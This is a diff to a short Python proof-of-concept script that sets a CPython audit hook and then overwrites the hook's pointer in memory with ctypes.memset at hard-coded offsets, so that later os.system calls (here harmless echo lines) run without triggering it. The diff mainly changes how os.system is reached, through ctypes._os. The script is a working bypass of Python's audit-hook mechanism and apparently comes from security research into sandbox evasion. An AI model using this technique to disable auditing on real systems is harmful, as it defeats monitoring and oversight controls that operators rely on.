@@ -4,13 +4,13 @@
 ### only use offset to memset the audit hook set by C api
 
 from audit_hook_head_finder import add_audit
-import ctypes, os
+import ctypes
 
 add_audit()
 
 obj = ctypes.byref(ctypes.py_object(()))
 
-os.system("echo 'test audit hook -- this will trigger hook'")
+ctypes._os.system("echo 'test audit hook -- this will trigger hook'")
 
 # the offsets are from POC-native.py: 
 # Python 3.11 = -0xe388
@@ -22,4 +22,4 @@ ctypes.memset(
     ), 0, 8
 )
 
-os.system("echo 'test audit hook -- this will not'")
+ctypes._os.system("echo 'test audit hook -- this will not'")
